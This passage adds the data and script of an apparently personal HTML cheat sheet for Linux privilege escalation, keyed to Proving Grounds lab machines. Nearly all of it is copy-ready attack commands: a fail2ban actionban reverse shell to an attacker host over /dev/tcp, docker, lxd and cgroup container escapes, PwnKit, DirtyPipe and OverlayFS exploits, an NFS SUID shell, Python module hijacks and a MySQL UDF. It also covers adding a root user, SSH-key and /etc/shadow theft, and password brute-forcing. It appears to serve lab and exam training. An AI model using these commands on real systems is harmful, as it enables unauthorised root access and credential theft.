+    triggers: ['sudo systemctl', 'systemctl pager', 'scrutiny'],
+    action: 'sudo systemctl sometimes pages output through less → !sh = root. Scrutiny technique.',
+    cmd: `# Method 1 — Scrutiny / pager
+sudo /usr/bin/systemctl status
+# If output uses less:
+# inside less: !sh
+# → root shell
+
+# Method 2 — SUID systemctl
+cat > /tmp/root.service <<'EOF'
+[Unit]
+Description=root
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
+[Install]
+WantedBy=multi-user.target
+EOF
+
+/usr/bin/systemctl link /tmp/root.service
+/usr/bin/systemctl enable --now root.service
+
+/tmp/rootbash -p
+
+# Reference: PG #60 Scrutiny`,
+    cleanup: 'systemctl disable root.service · rm /tmp/root.service /tmp/rootbash'
+  },
+  { id: 'fail2ban-actionban', phase: 'abuse', tags: ['pg10'], title: '⭐ fail2ban action.d writable [PG #10 Fail]',
+    triggers: ['fail2ban', 'action.d', 'actionban', 'fail', 'iptables-multiport'],
+    action: 'Your PG Fail technique. fail2ban as root, writable action.d/*.conf. Replace actionban, trigger via failed SSH (hydra).',
+    cmd: `# Confirm fail2ban as root
+ps -ef | grep fail2ban
+# root  ...  /usr/bin/python3 /usr/bin/fail2ban-server ...
+
+# Confirm action.d writable
+ls -la /etc/fail2ban/action.d/
+
+# Edit banaction
+nano /etc/fail2ban/action.d/iptables-multiport.conf
+# Find: actionban = ...
+# Replace:
+# actionban = chmod +s /bin/bash
+
+# Trigger via failed SSH (3+ wrong attempts)
+# From Kali:
+hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://<IP>
+# wait ~1min
+
+# Or reverse shell as actionban
+# actionban = bash -c 'bash -i >& /dev/tcp/<KALI>/4444 0>&1'
+
+# Use SUID bash
+/bin/bash -p
+
+# Reference: PG #10 Fail (your walkthrough)`,
+    cleanup: 'restore actionban · chmod -s /bin/bash'
+  },
+
+  { id: 'docker-group', phase: 'abuse', tags: ['pg70'], title: 'docker group → mount / [PG #70 Peppo]',
+    triggers: ['docker group', 'docker mount', 'peppo', 'breakout'],
+    action: 'docker group ≈ root. Mount host fs into container, chroot in.',
+    cmd: `# Confirm
+id | grep docker
+docker version
+
+# Method 1 — alpine chroot (cleanest)
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# You are root on host
+
+# Method 2 — no internet for pull
+docker images
+docker run -v /:/mnt --rm -it <existing-image> chroot /mnt sh
+
+# Method 3 — copy SSH key
+docker run -v /root:/r --rm alpine cat /r/.ssh/id_rsa > /tmp/rkey
+chmod 600 /tmp/rkey
+ssh -i /tmp/rkey root@localhost
+
+# Method 4 — read shadow
+docker run -v /etc:/e --rm alpine cat /e/shadow
+
+# Reference: PG #70 Peppo`,
+    cleanup: 'docker container rm <name> · rm /tmp/rkey'
+  },
+  { id: 'lxd-group', phase: 'abuse', tags: [], title: 'lxd / lxc → privileged container',
+    triggers: ['lxd', 'lxc', 'privileged container'],
+    action: 'lxd group lets you create privileged containers that mount host fs. Alpine image import + -privileged.',
+    cmd: `# Confirm
+id | grep lxd
+
+# Build image on Kali (one-time)
+go install github.com/lxc/distrobuilder/distrobuilder@latest
+git clone https://github.com/lxc/lxc-ci
+cd lxc-ci
+sudo distrobuilder build-lxd images/alpine.yaml -o image.release=3.18
+
+# Transfer
+scp rootfs.squashfs lxd.tar.xz <user>@<IP>:/tmp/
+
+# Victim:
+lxc image import /tmp/lxd.tar.xz /tmp/rootfs.squashfs --alias alpine
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+
+# Inside:
+cd /mnt/root
+chroot . /bin/bash`,
+    cleanup: 'lxc stop privesc; lxc delete privesc; lxc image delete alpine'
+  },
+  { id: 'disk-group', phase: 'abuse', tags: ['pg48'], title: 'disk group (6) → debugfs [PG #48 Extplorer]',
+    triggers: ['disk group', '6(disk)', 'debugfs', 'extplorer', 'fanastic'],
+    action: 'disk group reads raw block devices → /etc/shadow / SSH keys. Fanastic + Extplorer used this.',
+    cmd: `# Confirm
+id | grep 'disk'
+# uid=1000(user) gid=6(disk)
+
+# Find root partition
+df /
+
+# Open with debugfs
+debugfs /dev/sda1
+debugfs:  cat /etc/shadow
+debugfs:  cat /root/.ssh/id_rsa
+debugfs:  cat /root/proof.txt
+debugfs:  quit
+
+# Or dd (export anything)
+dd if=/dev/sda1 of=/tmp/disk.img count=1
+# Mount on Kali to browse
+
+# Crack shadow on Kali
+unshadow /etc/passwd /tmp/shadow > unshadowed
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
+
+# Reference: PG #48 Extplorer, PG #17 Fanastic`,
+    cleanup: 'rm /tmp/disk.img'
+  },
+  { id: 'adm-group', phase: 'abuse', tags: [], title: 'adm group → read /var/log/*',
+    triggers: ['adm group', '/var/log', 'syslog group'],
+    action: 'adm = log reader. /var/log/auth.log + syslog often contain creds typed at wrong prompts.',
+    cmd: `# Confirm
+id | grep adm
+
+# Hunt creds
+grep -r 'password' /var/log/ 2>/dev/null
+grep -r 'PASSWORD' /var/log/ 2>/dev/null
+grep -r 'sudo' /var/log/auth.log
+
+# auth.log goldmine — typos
+cat /var/log/auth.log* 2>/dev/null | grep -iE 'password|pass='
+
+# syslog
+cat /var/log/syslog* 2>/dev/null | grep -iE 'password|user'
+
+# Older rotated logs
+ls -la /var/log/*.gz
+zcat /var/log/auth.log.*.gz | grep -i password`,
+    cleanup: ''
+  },
+  { id: 'rbash-escape', phase: 'abuse', tags: ['pg70'], title: 'rbash escape — ed/vi/awk [PG #70 Peppo]',
+    triggers: ['rbash', 'restricted shell', 'shell escape', 'peppo'],
+    action: 'Restricted shell limits commands. Common escapes: ed/vi → :!sh, awk system(), ssh -t, find -exec.',
+    cmd: `# Confirm rbash
+echo $SHELL                  # /bin/rbash
+echo $PATH                   # often very short
+
+# Method 1 — ed (always available)
+ed
+!/bin/bash
+
+# Method 2 — vi/vim
+vi
+:set shell=/bin/bash
+:shell
+
+# Method 3 — awk
+awk 'BEGIN {system("/bin/bash")}'
+
+# Method 4 — ssh with command
+ssh user@localhost -t "bash --noprofile --norc"
+
+# Method 5 — find -exec
+find / -name nothing -exec /bin/bash \\;
+
+# Method 6 — env trick
+BASH_CMDS[a]=/bin/sh; a
+export PATH=$PATH:/bin:/usr/bin
+export SHELL=/bin/bash
+
+# Reference: PG #70 Peppo (used ed)`,
+    cleanup: ''
+  },
+  { id: 'container-escape', phase: 'abuse', tags: [], title: 'Docker container escape — privileged + cap',
+    triggers: ['container escape', 'docker breakout', 'cgroup escape'],
+    action: 'Inside a container with privileged or specific caps, escape to host. cgroup release_agent classic.',
+    cmd: `# In a container?
+ls /.dockerenv               # exists = docker
+cat /proc/1/cgroup           # docker/podman?
+hostname                      # often hash-like
+
+# Check privs
+capsh --print
+
+# Method 1 — privileged container, cgroup release_agent (kernel <5.11)
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=\`sed -n 's/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p' /etc/mtab\`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "ps -ef > $host_path/output" >> /cmd
+chmod +x /cmd
+sh -c "echo \\\$\\\$ > /tmp/cgrp/x/cgroup.procs"
+cat /output
+
+# Method 2 — deepce automation
+wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
+chmod +x deepce.sh
+./deepce.sh
+
+# Method 3 — Docker socket mounted
+ls /var/run/docker.sock
+# spawn priv container that mounts /`,
+    cleanup: ''
+  },
+
+  { id: 'pwnkit', phase: 'abuse', tags: ['pg18'], title: 'pkexec PwnKit · CVE-2021-4034 [PG #18 Exghost]',
+    triggers: ['pwnkit', 'pkexec', 'cve-2021-4034', 'polkit', 'exghost'],
+    action: 'Polkit pkexec memory corruption — works on basically every distro from 2009 to early 2022. Exghost used this.',
+    cmd: `# Confirm vulnerable
+ls -la /usr/bin/pkexec        # SUID
+pkexec --version
+
+# Compile + run (ly4k variant most reliable)
+git clone https://github.com/ly4k/PwnKit
+cd PwnKit
+gcc -o pwnkit pwnkit.c
+
+# Transfer
+scp pwnkit <user>@<IP>:/tmp/
+
+# Run
+chmod +x /tmp/pwnkit
+/tmp/pwnkit
+# root shell
+
+# Python variant (no compile)
+git clone https://github.com/joeammond/CVE-2021-4034
+python3 CVE-2021-4034.py
+
+# Reference: PG #18 Exghost`,
+    cleanup: 'rm /tmp/pwnkit'
+  },
+  { id: 'dirty-pipe', phase: 'abuse', tags: [], title: 'DirtyPipe · CVE-2022-0847 (5.8-5.17)',
+    triggers: ['dirty pipe', 'cve-2022-0847', 'kernel 5.8', 'pipe splice'],
+    action: 'Kernel 5.8 to 5.16.11 / 5.15.25 / 5.10.102. Overwrites readable files (incl SUID). Replace /etc/passwd or backdoor /usr/bin/su.',
+    cmd: `# Confirm kernel
+uname -r
+# 5.8 ≤ x < 5.10.102 / 5.15.25 / 5.16.11 → vulnerable
+
+# Exploit 1 — overwrite /etc/passwd
+git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
+cd CVE-2022-0847-DirtyPipe-Exploit
+./compile.sh
+./exploit
+# Asks for new root pwd, modifies /etc/passwd
+
+# Exploit 2 — SUID hijack (cleaner)
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
+cd CVE-2022-0847-DirtyPipe-Exploits
+./compile.sh
+./exploit-2 /usr/bin/su
+# Now su = root without pwd`,
+    cleanup: 'restore /etc/passwd from backup'
+  },
+  { id: 'overlayfs', phase: 'abuse', tags: [], title: 'OverlayFS · CVE-2021-3493 (Ubuntu)',
+    triggers: ['overlayfs', 'cve-2021-3493', 'ubuntu kernel'],
+    action: 'Ubuntu-specific overlayfs perm check bypass. Unprivileged user gains SUID via overlay mount.',
+    cmd: `# Confirm vulnerable (Ubuntu 14/16/18/20.04 specific patches)
+cat /etc/os-release
+uname -r
+# Check advisory
+
+# Exploit
+git clone https://github.com/briskets/CVE-2021-3493
+cd CVE-2021-3493
+gcc exploit.c -o exploit
+./exploit
+# root`,
+    cleanup: 'rm exploit'
+  },
+  { id: 'writable-passwd', phase: 'abuse', tags: [], title: '/etc/passwd writable → add root2',
+    triggers: ['writable passwd', 'add root user', 'openssl passwd'],
+    action: 'Classic. If /etc/passwd is writable (sometimes via cron, sometimes misconfig), add UID 0 user.',
+    cmd: `# Confirm
+ls -la /etc/passwd
+# -rw-rw-rw-  ← world writable!
+
+# Generate hash
+openssl passwd -1 -salt salt mypassword
+# $1$salt$xxxxxxxxxxxxxxxxxxxxxx
+
+# Append
+echo 'root2:$1$salt$xxxxxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# Switch
+su root2
+# Password: mypassword
+# whoami → root
+
+# Same primitive when /etc/passwd is the cron payload (PG Fail final stage)`,
+    cleanup: 'remove root2 line from /etc/passwd'
+  },
+  { id: 'nfs-no-root-squash', phase: 'abuse', tags: [], title: 'NFS no_root_squash → plant SUID',
+    triggers: ['no_root_squash', 'nfs privesc', 'nfs export'],
+    action: 'Victim shares NFS with no_root_squash. Mount on attacker, compile SUID root binary, drop in mount, run on victim.',
+    cmd: `# Check from attacker
+showmount -e <IP>
+# /shared    (no_root_squash visible) OR /home
+
+# Mount as ROOT on Kali
+sudo mkdir /mnt/nfs
+sudo mount -t nfs <IP>:/shared /mnt/nfs -o nolock
+
+# Compile SUID shell as root
+cat > /tmp/x.c <<'EOF'
+#include <unistd.h>
+int main() { setuid(0); setgid(0); execl("/bin/bash","bash","-p",NULL); return 0; }
+EOF
+sudo gcc /tmp/x.c -o /mnt/nfs/x
+sudo chmod 4755 /mnt/nfs/x
+
+# Verify on victim
+ls -la /shared/x
+# -rwsr-xr-x  root root  <-- SUID root!
+
+# Execute on victim
+/shared/x
+# uid=0(root)`,
+    cleanup: 'rm /shared/x · umount /mnt/nfs on Kali'
+  },
+  { id: 'python-lib-hijack', phase: 'abuse', tags: ['pg28'], title: 'Python module hijack [PG #28 Sona]',
+    triggers: ['python lib hijack', 'module hijack', 'sona', 'site-packages', 'pythonpath'],
+    action: 'Sona: a script run as root imports a Python module from writable dir. Replace module → runs at import time.',
+    cmd: `# Find writable Python paths
+python3 -c 'import sys; print(sys.path)'
+for p in $(python3 -c 'import sys; [print(x) for x in sys.path]'); do
+  [ -w "$p" ] && echo "WRITABLE: $p"
+done
+
+# Or find import targets
+cat /opt/<script>.py | grep ^import
+
+# Find module location
+python3 -c 'import config; print(config.__file__)'
+
+# Overwrite if writable
+cat > /writable-path/config.py <<'EOF'
+import os
+os.setuid(0)
+os.system("chmod +s /bin/bash")
+EOF
+
+# Wait for re-run or invoke
+sudo /opt/<script>.py
+
+# Use SUID bash
+/bin/bash -p
+
+# Reference: PG #28 Sona`,
+    cleanup: 'restore module · chmod -s /bin/bash'
+  },
+  { id: 'ssh-key-hunt', phase: 'abuse', tags: ['pg44'], title: 'SSH key hunt + reuse [PG #44 Boolean, #60 Scrutiny]',
+    triggers: ['ssh keys', 'id_rsa hunt', 'authorized_keys', 'boolean', 'scrutiny'],
+    action: 'find all id_rsa keys + authorized_keys. Try each as login for any user. Boolean + Scrutiny hinged on this.',
+    cmd: `# Find all keys
+find / -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'id_ecdsa*' 2>/dev/null
+find / -name 'authorized_keys' 2>/dev/null
+find / -name '.ssh' -type d 2>/dev/null
+
+# Via debugfs (disk-group):
+debugfs /dev/sda1
+debugfs:  cat /root/.ssh/id_rsa
+
+# Test each key for each user
+for k in $(find / -name id_rsa* 2>/dev/null); do
+  for u in root admin <users-on-box>; do
+    ssh -i $k -o StrictHostKeyChecking=no -o BatchMode=yes $u@localhost 'id' 2>/dev/null
+  done
+done
+
+# Force key auth
+ssh -i id_rsa -o PreferredAuthentications=publickey root@localhost
+
+# Reference: PG #44 Boolean (RAILS leaked keys),
+#            PG #60 Scrutiny (id_rsa in git repo)`,
+    cleanup: ''
+  },
+  { id: 'mysql-udf-root', phase: 'abuse', tags: ['pg6'], title: 'MySQL UDF [PG #6 Pebbles]',
+    triggers: ['mysql udf', 'mysql root', 'pebbles', 'raptor_udf2'],
+    action: 'MySQL as root + you have DB creds → load malicious UDF .so → exec as root. Pebbles pattern.',
+    cmd: `# Confirm MySQL is root
+ps -ef | grep mysql
+# root     2345  ... /usr/sbin/mysqld
+
+# Login
+mysql -u root -p<pwd>
+
+# Get plugin dir
+SHOW VARIABLES LIKE 'plugin_dir';
+# e.g. /usr/lib/mysql/plugin/
+
+# Compile UDF on Kali
+# Source: /usr/share/exploitdb/exploits/linux/local/1518.c
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+# Transfer to webroot or /tmp
+# Within MySQL:
+USE mysql;
+CREATE TABLE foo(line BLOB);
+INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
+SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
+CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
+SELECT do_system('chmod +s /bin/bash');
+EXIT;
+
+# Use SUID bash
+/bin/bash -p
+
+# Reference: PG #6 Pebbles`,
+    cleanup: 'DROP FUNCTION do_system; DROP TABLE foo; · chmod -s /bin/bash'
+  },
+  { id: 'sudo-gcore', phase: 'abuse', tags: ['pg41'], title: 'sudo gcore → strings core [PG #41 Pelican]',
+    triggers: ['sudo gcore', 'gcore', 'pelican', 'core dump creds'],
+    action: 'Pelican: sudo gcore could dump root process memory. strings the core → find root pwd embedded.',
+    cmd: `# Confirm
+sudo -l
+# (root) NOPASSWD: /usr/bin/gcore
+
+# Find juicy root process
+ps -ef | grep -E 'root.*su|sudo|sshd'
+
+# Dump memory
+sudo /usr/bin/gcore <PID>
+# Creates core.<PID>
+
+# Strings + grep
+strings core.<PID> | grep -i 'password\\|passwd' | sort -u
+strings core.<PID> | grep -A2 -B2 'su -'
+
+# Sometimes you see:
+# su -c root
+# RootPwd123!
+
+# Reference: PG #41 Pelican`,
+    cleanup: 'rm core.*'
+  },
+  { id: 'pw-reuse-su', phase: 'abuse', tags: [], title: 'Password reuse — su as every user',
+    triggers: ['password reuse', 'su sweep', 'cred reuse'],
+    action: 'After any cred discovery, try su for every other user. People reuse pwds heavily — especially service accounts.',
+    cmd: `# Get login-shell users
+grep -E '/bin/(ba)?sh$' /etc/passwd | cut -d: -f1 > /tmp/users.txt
+
+# Try cred against each
+for u in $(cat /tmp/users.txt); do
+  echo "[+] Trying $u..."
+  echo '<found-pwd>' | su -c 'id' $u 2>/dev/null
+done
+
+# Username as password
+for u in $(cat /tmp/users.txt); do
+  echo "[+] $u:$u..."
+  echo "$u" | su -c 'id' $u 2>/dev/null
+done
+
+# Also: ssh with pwd via sshpass
+for u in $(cat /tmp/users.txt); do
+  sshpass -p '<pwd>' ssh -o StrictHostKeyChecking=no $u@localhost id 2>/dev/null
+done`,
+    cleanup: 'rm /tmp/users.txt'
+  },
+];
+
+const phaseOrder = ['enum', 'abuse', 'win'];
+const phaseLabels = { enum: 'ENUM', abuse: 'EXPLOIT', win: 'WIN' };
+
+const $ = (sel) => document.querySelector(sel);
+const searchEl = $('#search'); const resultsEl = $('#results');
+const filterBtns = document.querySelectorAll('.pill');
+let activeFilter = 'all'; let query = '';
+
+function escapeHtml(s) { return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
+function highlight(text, q) {
+  if (!q) return escapeHtml(text);
+  const escaped = escapeHtml(text);
+  const terms = q.split(/\s+/).filter(t => t.length > 0).map(t => t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+  if (!terms.length) return escaped;
+  const re = new RegExp(`(${terms.join('|')})`, 'gi');
+  return escaped.replace(re, '<mark>$1</mark>');
+}
+function matchesQuery(p, q) {
+  if (!q) return true;
+  const hay = [p.title, p.action, p.cmd, p.triggers.join(' '), (p.tags||[]).join(' '), p.id].join(' ').toLowerCase();
+  const terms = q.toLowerCase().split(/\s+/).filter(t => t.length > 0);
+  return terms.every(t => hay.includes(t));
+}
+function matchesFilter(p, f) { return f === 'all' ? true : p.phase === f; }
+function renderCard(p, q) {
+  const tH = p.triggers.map(t => {
+    const m = q && q.toLowerCase().split(/\s+/).some(qt => qt.length > 0 && t.toLowerCase().includes(qt));
+    return `<span class="trigger ${m ? 'match' : ''}">${escapeHtml(t)}</span>`;
+  }).join('');
+  const cH = p.cmd ? `<div class="cmd-wrap"><pre class="cmd">${highlight(p.cmd, q)}</pre><button class="cmd-copy" data-cmd="${encodeURIComponent(p.cmd)}">COPY</button></div>` : '';
+  const clH = p.cleanup ? `<div class="cleanup"><span class="cleanup-label">CLEANUP</span>${escapeHtml(p.cleanup)}</div>` : '';
+  const pgTag = (p.tags || []).find(t => t.startsWith('pg')) ? `<span class="pg-tag">PG #${(p.tags.find(t => t.startsWith('pg'))).slice(2)}</span>` : '';
+  return `<article class="card" data-phase="${p.phase}" id="card-${p.id}">
+    <div class="card-head"><div class="card-title">${highlight(p.title, q)}</div><span class="card-cat">${phaseLabels[p.phase]}</span></div>
+    <div class="triggers">${tH}</div>
+    <div class="arrow-line"><span class="arrow">→</span><span class="action">${highlight(p.action, q)}</span></div>
+    ${cH}${clH}<div class="card-foot"><span></span>${pgTag}</div></article>`;
+}
+function render() {
+  const f = patterns.filter(p => matchesFilter(p, activeFilter) && matchesQuery(p, query));
+  $('#resultCount').textContent = f.length;
+  if (f.length === 0) { resultsEl.innerHTML = `<div class="empty"><div class="empty-icon">⌬</div><div class="empty-title">no patterns match</div><div class="empty-hint">try: 'sudo', 'suid', 'cron', 'docker', 'pwnkit', 'baron samedit'</div></div>`; return; }
+  let html = '';
+  if (activeFilter === 'all' && !query) {
+    phaseOrder.forEach(ph => {
+      const inPh = f.filter(p => p.phase === ph);
+      if (!inPh.length) return;
+      html += `<div style="margin: 18px 0 10px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.2em;">▸ ${phaseLabels[ph]} <span style="opacity:0.5">[${inPh.length}]</span></div>`;
+      html += `<div class="grid">${inPh.map(p => renderCard(p, query)).join('')}</div>`;
+    });
+  } else { html = `<div class="grid">${f.map(p => renderCard(p, query)).join('')}</div>`; }
+  resultsEl.innerHTML = html;
+  resultsEl.querySelectorAll('.cmd-copy').forEach(btn => {
+    btn.addEventListener('click', async (e) => {
+      e.stopPropagation();
+      try { await navigator.clipboard.writeText(decodeURIComponent(btn.dataset.cmd)); btn.textContent = 'COPIED'; btn.classList.add('copied'); setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500); } catch (err) { btn.textContent = 'ERR'; }
+    });
+  });
+}
+function updateCounts() {
+  $('#totalCount').textContent = patterns.length;
+  $('#count-all').textContent = patterns.length;
+  phaseOrder.forEach(ph => { const c = patterns.filter(p => p.phase === ph).length; const el = document.getElementById(`count-${ph}`); if (el) el.textContent = c; });
+}
+searchEl.addEventListener('input', (e) => { query = e.target.value.trim(); render(); });
+filterBtns.forEach(btn => { btn.addEventListener('click', () => { activeFilter = btn.dataset.filter; filterBtns.forEach(b => b.classList.toggle('active', b === btn)); render(); document.getElementById('cards').scrollIntoView({behavior: 'smooth', block: 'start'}); }); });
+document.addEventListener('keydown', (e) => {
+  if ((e.metaKey || e.ctrlKey) && e.key === 'k') { e.preventDefault(); searchEl.focus(); searchEl.select(); }
+  if (e.key === 'Escape' && document.activeElement === searchEl) { searchEl.value = ''; query = ''; render(); searchEl.blur(); }
+});
+document.querySelectorAll('.diagram svg a').forEach(a => {
+  a.addEventListener('click', (e) => {
+    const href = a.getAttribute('href');
+    if (!href || !href.startsWith('#card-')) return;
+    setTimeout(() => { const t = document.querySelector(href); if (t) { t.classList.remove('flash'); void t.offsetWidth; t.classList.add('flash'); } }, 100);
+  });
+});
+document.querySelectorAll('.checklist li').forEach(li => { li.addEventListener('click', () => li.classList.toggle('done')); });
+updateCounts(); render();
+</script>
+</body>
+</html>
